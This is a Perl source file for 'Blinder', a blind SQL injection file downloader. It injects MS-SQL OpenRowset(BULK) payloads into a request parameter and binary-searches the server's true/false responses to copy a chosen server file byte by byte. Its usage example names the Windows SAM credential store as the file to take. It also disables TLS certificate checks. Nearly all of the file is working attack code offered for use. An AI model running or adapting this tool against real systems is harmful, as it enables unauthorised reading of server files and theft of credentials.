# ***********************************************************
#  Author: Rajat Swarup
#  Version: 1.2 
#  Date: 22nd November 2008
#  Blinder:  Blind SQL Injection File Downloader
#    --url: URL
#    --browser: Browser to emulate
#    --ref: Referer tag
#    --cookie: Cookie
#    --params: parameters in the request
#    --post: POST request
#    --get: GET request
#    --verbose: verbose output
#    --header: Others HTTP Header
#    --out|o : Output file
#    --errorstr: Error shown when the file is absent
#    --searchstr: String to search for in a positive result
#    --fname: file to download
#    <SQL> : Use <SQL> tag as the point where the injection
#            strings would be replaced with.
#
# ***********************************************************
use Getopt::Long;
use LWP::Simple;
use LWP::UserAgent;
use HTTP::Cookies;
use URI::URL;
use IO::Socket::SSL qw();
require Config;

use strict;
#use diagnostics;

my $url;   #URL
my $port;  #Port
my $params;
my $ref;
my $length = 24;
my $verbose = '';
my $cookie ;
my $post ='';
my $get = '';
my $uagent;
my $proxy;
my $basicauth;
my $searchfor;
my $errorstr;
my $oracle = '';
my $mssql = '';
my $mysql = '';
my $help = '';
my @header;
my $filename;
my $log = 'test.log';
my $httpreq = LWP::UserAgent->new;
Getopt::Long::Configure ('bundling');
GetOptions ("url|u=s"       => \$url,
            "port|p=i"      => \$port,
	    "verbose|v"     => \$verbose,
	    "params|d=s"    => \$params,
	    "uagent|b=s"    => \$uagent,
	    "ref|r=s"       => \$ref,
	    "cookie|c=s"    => \$cookie,
	    "header|H=s"    => \@header,
	    "post|P"        => \$post,
	    "get|G"         => \$get,
	    "proxy|x=s"     => \$proxy,
	    "basicauth|B=s" => \$basicauth,
	    "searchfor|s=s" => \$searchfor,
	    "errorstr|e=s"  => \$errorstr,
	    "oracle|O"      => \$oracle,
	    "mssql|S"       => \$mssql,
	    "mysql|Y"       => \$mysql,
	    "fname|f=s"     => \$filename,
	    "out|o=s"       => \$log,
	    "help|h"        => \$help
           );
if ( ($get && $post ) || ($help) || ( ($oracle + $mssql + $mysql) > 1) ||
     ($searchfor eq "" && $errorstr eq "")
   ) {
  &print_usage();
  exit;
}
# certificate checks
$httpreq->ssl_opts( verify_hostname => 0 );
IO::Socket::SSL::set_ctx_defaults( SSL_verifycn_scheme => 'www', SSL_verify_mode => 0 );
$ENV{PERL_LWP_SSL_VERIFY_HOSTNAME}=0;

if ($proxy ne "") {
  $httpreq->proxy(['http','ftp','https'] => $proxy);
}
if (@header > 0) {
  foreach my $headerpair (@header) {
    my ($httpheader,$headerval)=split(/ /,$headerpair);
    $httpreq->default_headers($httpheader => $headerval);
  }
}
if ($cookie ne "") {
  my $cookiejar = HTTP::Cookies->new();
  my $urlobj = new URI::URL $url;
  my $secureflag; 
  
  if ($urlobj->scheme eq 'https') {
	$secureflag = 1;
  }
  else {
    $secureflag = 0; 
  }
  #$cookiejar->clear;
  my @cookie_split = split(/=/,$cookie);
  $cookiejar->set_cookie(0,$cookie_split[0],$cookie_split[1],'/',$urlobj->host,$urlobj->port($urlobj->default_port),0,0,86400,0);
  $httpreq->cookie_jar($cookiejar);
}
if ($uagent ne "") {
  $httpreq->agent($uagent);
}


if ($post) {
   my $resp;
   my @formdata;
   if ($params ne '') {
      &downloadfilebin($url,$params,"post",$searchfor,$filename,$errorstr,$log);
   }
   else{print "No Parameters in the POST";}
}
else {
  if ($get) {
    &downloadfilebin($url,$params,"get",$searchfor,$filename,$errorstr,$log);
  }
}

sub dopost #($url,$cookie,$header,$param) 
{
  return $httpreq->post($_[0],Content => $_[3]);
}

sub doget #($url,$cookie,$header,$param)
{
  return $httpreq->get($_[0],Content => $_[3]);
}

sub print_usage {
print <<END;
*******************************
 /    / /         |
(___ (    ___  ___| ___  ___
|   )| | |   )|   )|___)|   )
|__/ | | |  / |__/ |__  |
*******************************
Usage : $0 --url URL  --params PARAMETERS {--post|--get} --verbose --uagent BROWSER --mssql --searchfor Deborah --fname C:\Windows\repair\sam 
    --url: URL
    --browser: Browser to emulate
    --ref: Referer tag
    --cookie: Cookie
    --params: parameters in the request
    --post: POST request
    --get: GET request
    --verbose: verbose output
    --header: Others HTTP Header
    --searchfor: String to search for a positive test
    --errorstr: Alternatively, string to search for negative test
    --oracle: Oracle DB Flag
    --mssql: MS-SQL Server Flag
    --mysql: MySQL Server Flag
    --fname: File to download
    --out: File to save data in
    <SQL> : Use <SQL> tag as the point where the injection
            strings would be replaced with.

Example:
This request:
blinder.pl --url http://www.example.com/test.asp --params "q=5<SQL>&Search=1" --post --uagent "Mozilla/4.0" --cookie "JSESSIONID=ACE34222929EDA.004"
--fname "C:\Windows\repair\sam"

Translates into:
POST /test.asp HTTP/1.1
User-Agent: Mozilla/4.0

q=5%20and%201=1&Search=1
END
}

# $url - URL to send the req
# $param - Param string
# $requesttype - "get" or "post"
# $searchstr - String to look for in a positive result
# $errorpage - String to look for in an error page when the file is not found
sub downloadfilebin #($url,$param,$requesttype,$searchstr,$filename,$errorpage)
{
  my $OS = $Config::Config{'osname'};
  my ($url,$param,$requesttype,$searchstr,$filename,$errorpage,$outputfile) = @_;
  my $resp;
  my $bytenum = 1;
  my $cmpval = -1;
  my $payload;
#               and ASCII(substring((Select * From OpenRowset(BULK 'C:\test.txt',SINGLE_CLOB) As Data), 1, 1) ) = 65
  my $first = " and ASCII(substring((Select * From OpenRowset(BULK \'$filename\',SINGLE_CLOB) As Data),";
  my $center = ",1))>";
  my $starttime = localtime();
  print "Now beginning the download of $filename at $starttime\n";
  my $startsec = time;

  # Check if the file exists
  $bytenum = 1;
  $cmpval = -1;
  $payload = $first.$bytenum.$center.$cmpval;
  #$payload =~ s/([^A-Za-z0-9])/sprintf("%%%02X", ord($1))/seg;
  #$payload =~ s/\ /+/g;
  $param =~ s/<SQL>/$payload/g;
  if ($requesttype eq "post") {
    $resp=dopost($url,"","",$param);
	if ($verbose) {
		print STDERR "REQUEST: ",$url."?".$param,"\n";
		print STDERR "RESPONSE Header: ",$resp->status_line,"\n";
		#print STDERR $resp->content,"\n";
    }
  }
  else {
    $bytenum = 1;
    $resp=doget($url,"","",$param);
	if ($verbose) {
		print STDERR "REQUEST: ",$url."?".$param,"\n";
		print STDERR "RESPONSE Header: ",$resp->status_line,"\n";
		#print STDERR $resp->content,"\n";
    }
  }
  if ($resp ne '') {
    if ($resp->content =~ $errorpage) {
      print "File Not found!  OR a bad error page expression";
      exit;
    }
  }
  if ($verbose) {
    print STDERR "REQUEST: ".$url."?".$param,"\n";
	print STDERR "RESPONSE Header: ".$resp->status_line,"\n";
    #print STDERR $resp->content,"\n";
  }
  open(OUTFILE,"> $outputfile")
    or die "Error opening $outputfile";
  binmode OUTFILE;
  my $found = 0;
  $param = $_[1];
  #The file is present, now get character by character
  my $low = 0;
  my $high = 256;
  for ($bytenum=1; ;$bytenum++) {
    $low = 0; $high = 256;
    $found = 0; $cmpval = 0;
    # if ($verbose) {
      # my $cls;
      # if ($OS =~ /Win/i) { $cls="cls";}
      # elsif ($OS =~ /UNIX/i) {$cls="clear";}
      # system($cls); print "Getting byte $bytenum\n";
    # }
    while (!$found && $low <= $high) {
      my $mid = (($low + $high)-(($low + $high)%2))/2;
      $payload = $first.$bytenum.$center.$mid;
      $payload =~ s/\ /+/g;
      $param = $_[1];
      $param =~ s/<SQL>/$payload/g;
      if ($requesttype eq "post") {
        $resp=dopost($url,"","",$param);
		if ($verbose) {
	       print STDERR "REQUEST: ".$url."?".$param,"\n";
		   print STDERR "RESPONSE Header: ".$resp->status_line,"\n";
		}
      }
      else {
        $resp=doget($url,"","",$param);
        if ($verbose) {
	       print STDERR "REQUEST: ".$url."?".$param,"\n";
		   print STDERR "RESPONSE Header: ".$resp->status_line,"\n";
		}
	  }
      if ($verbose) {
         #print STDERR $url+"?"+$param,$resp->status_line,"\n";
         if ($resp->content =~ $searchstr) {
            #print "$requesttype $url $resp->message\n";
			print STDERR "Found:".$url."?".$param.$resp->status_line,"\n";
         }
      }
      if ($resp->content =~ $searchstr && $resp->content !~ $errorstr) { #bytevalue is greater
        $found = 0;
        $low = $mid+1;
      }
      else { #bytevalue is less than or equal
        $high = $mid;
        if ($low == $high) {
          $payload = $first.$bytenum.", 1) ) =".$mid;
          $payload =~ s/\ /+/g;
          $param = $_[1];
          $param =~ s/<SQL>/$payload/g;
          if ($requesttype eq "post") {
            $resp=dopost($url,"","",$param);
          }
          else {  #GET Req
            $resp=doget($url,"","",$param);
          }
          if ($resp->content =~ $searchstr) {
            $found = 1;
            print OUTFILE pack("C",$mid);
          }
          else { #EOF
            $found = 0;
            $low = 65535; #BIGINT therefore greater than everything
          }
        }
      }
    } #END of while
    last if ($low == 65535);
  }# All bytes
  my $endtime = localtime();
  my $endsec = time;
  print "Summary:\n";
  print "--------\n";
  print "Byte(s) written to $outputfile : ".($bytenum-1)."\n";
  print "Start time: $starttime\n";
  print "End   time: $endtime\n";
  print "Total data rate (Bytes/sec) ".(($bytenum-1)/($endsec- $startsec));
  close (OUTFILE);
}
